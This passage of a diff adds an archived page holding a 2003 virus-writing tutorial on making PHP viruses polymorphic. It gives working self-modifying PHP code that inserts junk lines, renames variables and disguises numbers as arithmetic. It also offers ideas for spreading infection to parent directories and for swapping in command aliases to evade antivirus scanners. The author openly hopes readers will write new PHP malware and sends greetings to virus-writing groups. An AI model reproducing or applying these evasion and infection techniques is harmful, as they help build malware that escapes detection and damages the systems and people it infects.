+  if ($string{0}!='/' &amp;&amp; $string{0}!='$') { $newcont.=$string.chr(13).chr(10); }
+  fwrite(fopen(__FILE__, 'w'),$newcont);
+}
+
+function trash($var) {
+  do { $var.=chr(rand(97,122)); } while (rand(0,7));
+  return $var;
+}
+?>
+</pre>
+<p>Everthing should be clear now, anyway, I'll tell you the most important things in this code-snip:</p>
+<ul>
+<li>It splits the whole filecontent of the virus ('__FILE__', as it's called in PHP) to lines (chr(13).chr(10)).</li>
+<li>One in two, if the last line wasn't a trash, it adds a trashline.</li>
+<li>If the last line was no trashline, it adds the line to the new content</li>
+<li>It writes the new content to the file</li>
+</ul>
+<h3><a name="p3b"></a>b) Variable Changing</h3>
+<p>This is another well-known script technique to morph the virus. So I did it again in PHP. Let's explain the technique. You're useing many varibles in a virus, and if the variables have the same name every generation, our friends the AV-guys are able to use this fact to detect the virus. So it could be of much value to change the variable-names. How I did it? I used an array with all my varibale, which i'm using. Than I searched for every value from the array in the virus-file (=i searched for every variable), and replaced it via the command 'str_replace' and used a new one, which got by my 'trash-function'. Now let's look at the source of the example:</p>
+<h4>Variable changing example</h4>
+<pre class="source">
+&lt;?php
+$changevars=array('changevars', 'content', 'newvars', 'counti','countj', 'trash');
+srand((double)microtime()*1000000);
+$content=fread(fopen(__FILE__,'r'),filesize(__FILE__));
+$counti=0;
+while($changevars[$counti]) {
+  $content=str_replace($changevars[++$counti], trash('',0), $content);
+}
+fwrite(fopen(__FILE__,'w'),$content);
+
+function trash($newvar, $countj) {
+  do { $newvar.=chr(rand(97,122)); } while (++$countj&lt;rand(5,15));
+  return $newvar;
+}
+?>
+</pre>
+<p>Easy code, easy to understand. Anyway, let me tell you, how it exactly works:</p>
+<ul>
+<li>Makes a new array with all variables and function-names</li>
+<li>Gets the whole content of the virus-file</li>
+<li>Replaces every element of the array in the content, and use a new one.</li>
+<li>Writes the content back to the file</li>
+</ul>
+<h3><a name="p3c"></a>c) Number Changing</h3>
+<p>Every code contains any numbers, whatever this number does. After thinking a little bit I found out, that I can change the numbers too. So I desited to make a PHP code, which changes the numbers in it's code. How can we change a number, you may think. It's really easy: You make a calculation with that number, which returns the number you want. Let's have a look at the possible variants:</p>
+<ul>
+<li>10=(12-2)</li>
+<li>10=(8+2)</li>
+<li>10=(80/8)</li>
+</ul>
+<p>I also tried to use div, but there are comma-numbers, which don't really work. But it's no problem, there are enought variants with just 3 calculation types. Now I'll show you, how a number could be after the 4th morphing:</p>
+<pre class="source">10=((((1289-9)/(6+2))/((15+5)-(4+6)))-(((252/6)/(7-1))-((4+3)-(30/5))))</pre>
+<p>Now I hope, that you know about the damn cool results of this technique :) After explaining the main-thing, I'll show you the little code, who changes the numbers.</p>
+<h4>Number Changing example</h4>
+<pre class="source">
+&lt;?php
+$newcont=fread(fopen(__FILE__,'r'),filesize(__FILE__));
+srand((double)microtime()*1000000);
+$count=-1; $number='';
+while(++$count&lt;strlen($newcont)) {
+  if (ord($newcont{$count})>47 &amp;&amp; ord($newcont{$count})&lt;58) {
+    $number=$newcont{$count};
+    while(ord($newcont{++$count})>47 &amp;&amp; ord($newcont{$count})&lt;58) { $number.=$newcont{$count}; }
+    $remn=rand(1,10);
+    switch(rand(1,3)) {
+      case 1:
+        $cont.='('.($number-$remn).'+'.$remn.')'; break;
+      case 2:
+        $cont.='('.($number+$remn).'-'.$remn.')'; break;
+      case 3:
+        $cont.='('.($number*$remn).'/'.$remn.')'; break;
+    }
+  }
+  $cont.=$newcont{$count};
+  $number='';
+}
+fwrite(fopen(__FILE__,'w'),$cont);
+?>
+</pre>
+<p>Now a shourt explanation about the code:</p>
+<ul>
+<li>Reads everything from the file</li>
+<li>Searchs for a number in every sign [sign>chr(47) &amp;&amp; sign&lt;chr(58)]</li>
+<li>Reads the rest of the number</li>
+<li>makes a new calculation with that number</li>
+<li>Writes the new content to the file</li>
+</ul>
+<h2><a name="p4"></a>4) Other thoughts</h2>
+<p>When I wrote this article, some other ideas came to my mind, therefore I also what to give the ideas to you. Maybe that some of the ideas are just non-sense or other are brilliant (I don't think so, but wonder happens :D ). OK, let's start: This part contains ideas for better hideing to don't become detected, or how to spread faster. I hope, you also like to read this!</p>
+<h3><a name="p4a"></a>a) Find more files</h3>
+<p>What must we do if we want to find more files? Search in more directories. :) My idea is this one: Since the command 'getcwd()' returns the current dir, we are able to infect also every root-directory. How to do this? Look at the return-value of 'getcwd()':</p>
+<p>E:\SPTH\Programme\minixampp\htdocs</p>
+<p>Now we have 4 directories, which aren't infected so far:</p>
+<pre class="source">
+          ~~ E:\SPTH\Programme\minixampp
+          ~~ E:\SPTH\Programme
+          ~~ E:\SPTH
+          ~~ E:\
+</pre>
+<p>And how to get the directories? Just searchs for a '\' in the current dir, than delete character by character, till you have a '\'. Than you have the directory-name. The rest is easy: Open it via 'opendir()', and do the same as I tried to explain you :)</p>
+<h3><a name="p4b"></a>b) Changing the commands</h3>
+<p>Maybe you already know it, but PHP contains tons of aliases for different commands and we can use that. I'm sure you know how :) Just replace one command with another, which is doing the same. I made a list of commands and it's aliases, to show you, how much we are able to change. This is just a short list, nevertheless it could be useful, when you want to make such a polymorphism virus.</p>
+<pre class="source">
+         chop                   -     rtrim()
+         close                  -     closedir()
+         die                    -     exit()
+         dir                    -     getdir()
+         doubleval              -     floatval()
+         fputs                  -     fwrite()
+         ini_alter              -     ini_set()
+         is_double              -     is_float()
+         is_integer             -     is_int()
+         is_long                -     is_int()
+         is_real                -     is_float()
+         is_writeable           -     is_writable()
+         join                   -     implode()
+         magic_quotes_runtime   -     set_magic_quotes_runtime() 
+         pos                    -     current()
+         rewind                 -     rewinddir()
+         show_source            -     highlight_file()
+         sizeof                 -     count()
+         strchr                 -     strstr()
+</pre>
+<p>Get the full list of aliases here: <a href="http://zend.com/phpfunc/all_aliases.php">http://zend.com/phpfunc/all_aliases.php</a></p>
+<h2><a name="p5"></a>5) Last Words</h2>
+<p>Comming to an end I want to say that I had really much fun while discovering this language, and I also hope, that you learned some things. I hope, that I will see many new and good PHP maleware in near future. If I don't see any, I know, that I worked 2-3 month for nothing. :) But let's see it positiv: Now it's easy to write strong viruses for this language, because the techniques are already discovered. Here at this point I want to thank MaskBits/VXI for making the first PHP maleware called PHP.Pirus, which were released in 29a#5. This inspired me in writing this article, because I found out, that the current PHP viruses are not at the point where you can say: "It's perfect, we can't make it better." :). Another guy I want to thank is SnakeByte, because of his articles about Perl poly/EPO/encryption in 29a#6. It helped me in some parts of this article. Greets goes also to Kefi, who wrote also a PHP-polymorphic virus, which I haven't seen so far. The fact that I know that made me very activ in writing this article :). Now I want to send some greets and thanks out to the world, because I think that I said everything, what is important:</p>
+<p>PhileT0aster and the rest of the rRlf-gang ;), jackie for being something like an idol for me, SlageHammer &amp; Knowdeth - the most friendly VX guys i know :), VirusBuster - for answering my stupid questions every time, Vorgon - for trying to teach me assembler :D, Toro - for helping me with many problems, SnakeByte for the great tutorials you wrote, SAD1c - for beeing a great guy, VorteX &amp; Worf for being the first guys who helped in the VX-world :), VxF &amp; Metal for the great fun in IRC :), Doctor Rave for some great ideas you gave me, prizzy for the nice email you wrote, herm1t for hosting my homepage, sinocred for hateing the '&lt;SPTH> hi' :D, PanoiX for being a cool guy :), Arzy for being very helpful :D, Necronomikon &amp; Gigabyte for cool talks in IRC (unfortunatly we have nearly no contact recently) and many other cool individuals I know... :) I also want to send out some group greets: Greets to rRlf (of course :D), 29A, iKx, SLAM, TKT, MIONS, Whackerz and every other more or less activ virus-writing-group!</p>
+<pre>
+                                                        - - - - - - - - - - - - - - -
+                                                          Second Part To Hell/[rRlf]  
+                                                          www.spth.de.vu
+                                                          <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="83f0f3f7ebc3e2ecedeee2eaefade2f7">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>
+                                                          written from oct-november 2003
+                                                          Austria
+                                                        - - - - - - - - - - - - - - - </pre>[<a style="" href="/lib/?lang=EN&amp;index=MA#vsp05">Back to index</a>] [<a href="/lib/vsp05.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
+<script type="text/rocketscript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
+<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
+<div style="margin-top: 2px; float: left;" class="adsapeu">
+<script type="text/rocketscript">
+<!--
+var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
+//-->
+</script>
+</div>
+<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
+<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vsp05">de</a><a href="/lib/index.php?lang=en&amp;id=vsp05">en</a><a href="/lib/index.php?lang=es&amp;id=vsp05">es</a><a href="/lib/index.php?lang=it&amp;id=vsp05">it</a><a href="/lib/index.php?lang=fr&amp;id=vsp05">fr</a><a href="/lib/index.php?lang=pl&amp;id=vsp05">pl</a><a href="/lib/index.php?lang=ru&amp;id=vsp05">ru</a><a href="/lib/index.php?lang=ua&amp;id=vsp05">ua</a></div>
+</body>
+</html>
